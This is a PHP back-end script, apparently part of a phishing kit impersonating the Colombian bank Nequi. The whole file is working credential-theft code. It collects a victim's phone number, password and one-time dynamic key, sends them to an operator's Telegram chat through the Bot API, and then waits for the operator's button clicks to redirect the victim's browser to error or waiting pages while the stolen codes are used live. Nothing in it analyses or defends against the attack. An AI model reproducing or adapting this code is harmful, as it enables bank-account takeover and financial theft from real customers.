<?php
ini_set('display_errors', 1);
error_reporting(E_ALL);
header('Content-Type: application/json');

/* ================= CONFIG ================= */
function loadConfig()
{
    $file = __DIR__ . '/../../config.php';
    if (!file_exists($file)) return null;
    $c = require $file;
    if (empty($c['bot_token']) || empty($c['chat_id'])) return null;
    return ['token'=>$c['bot_token'],'chat_id'=>$c['chat_id']];
}

function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES,'UTF-8'); }

/* ================= MENSAJE ================= */
function buildMessage(array $d, string $ip): string {
    $msg  = "<b>💎 NEQUI - CLAVE DINAMICA 💎</b>\n";
    if (!empty($d['numero']))   $msg.="• 📞 <code>".h($d['numero'])."</code>\n";
    if (!empty($d['clave']))    $msg.="• 🔐 <code>".h($d['clave'])."</code>\n";
    if (!empty($d['dinamica'])) $msg.="• 🛡️ <code>".h($d['dinamica'])."</code>\n";
    return $msg;
}

/* ================= TELEGRAM ================= */
function tg($method,$token,$data){
    $ch=curl_init("https://api.telegram.org/bot{$token}/{$method}");
    curl_setopt_array($ch,[
        CURLOPT_RETURNTRANSFER=>1,
        CURLOPT_POST=>1,
        CURLOPT_HTTPHEADER=>['Content-Type:application/json'],
        CURLOPT_POSTFIELDS=>json_encode($data)
    ]);
    $res=curl_exec($ch);
    curl_close($ch);
    return json_decode($res,true);
}

/* ================= CONTROLLER ================= */
$config = loadConfig();
if (!$config){ echo json_encode([]); exit; }

$token=$config['token'];
$chat=$config['chat_id'];
$store=__DIR__.'/state.json';

/* ---------- POST ---------- */
if ($_SERVER['REQUEST_METHOD']==='POST'){
    $data=json_decode(file_get_contents('php://input'),true) ?: [];
    $tid=uniqid('txn_');
    $msg=buildMessage($data,$_SERVER['REMOTE_ADDR']);

    $keyboard=[
        'inline_keyboard'=>[
            [['text'=>'🧠 Dinámica','callback_data'=>"dinamica:$tid"]],
            [['text'=>'🏠 Logo','callback_data'=>"logo:$tid"]],
            [['text'=>'✅ Confirmar','callback_data'=>"confirmar:$tid"]],
            [['text'=>'✅ Fin','callback_data'=>"fin:$tid"]],
        ]
    ];

    $sent=tg('sendMessage',$token,[
        'chat_id'=>$chat,
        'text'=>$msg,
        'parse_mode'=>'HTML',
        'reply_markup'=>json_encode($keyboard)
    ]);

    file_put_contents($store,json_encode([
        'tid'=>$tid,
        'mid'=>$sent['result']['message_id'],
        'msg'=>$msg,
        'offset'=>0
    ]));

    echo json_encode(['tid'=>$tid]);
    exit;
}

/* ---------- GET ---------- */
if ($_SERVER['REQUEST_METHOD']==='GET' && isset($_GET['tid'])){
    $state=json_decode(@file_get_contents($store),true);
    if (!$state || $state['tid']!==$_GET['tid']){ echo json_encode([]); exit; }

    $updates=tg('getUpdates',$token,['offset'=>$state['offset']+1]);

    foreach ($updates['result']??[] as $u){
        $state['offset']=$u['update_id'];

        if (empty($u['callback_query'])) continue;
        if (strpos($u['callback_query']['data'],$state['tid'])===false) continue;

        // RESPONDER EL CLICK (CLAVE)
        tg('answerCallbackQuery',$token,[
            'callback_query_id'=>$u['callback_query']['id']
        ]);

        $action=explode(':',$u['callback_query']['data'])[0];
        $user=$u['callback_query']['from']['username'] ?? 'user';

        tg('editMessageText',$token,[
            'chat_id'=>$chat,
            'message_id'=>$state['mid'],
            'text'=>$state['msg']."\n<b>Acción:</b> ".strtoupper($action)."\n<b>Por:</b> @$user",
            'parse_mode'=>'HTML'
        ]);

        unlink($store);

        $map=[
            'fin'=>'../fin.php',
            'logo'=>'index.html',
            'dinamica'=>'error_dinamica.php',
            'confirmar'=>'../espera.php' // NUEVA RUTA
        ];

        echo json_encode(['redirect'=>$map[$action]??'']);
        exit;
    }

    file_put_contents($store,json_encode($state));
    echo json_encode([]);
    exit;
}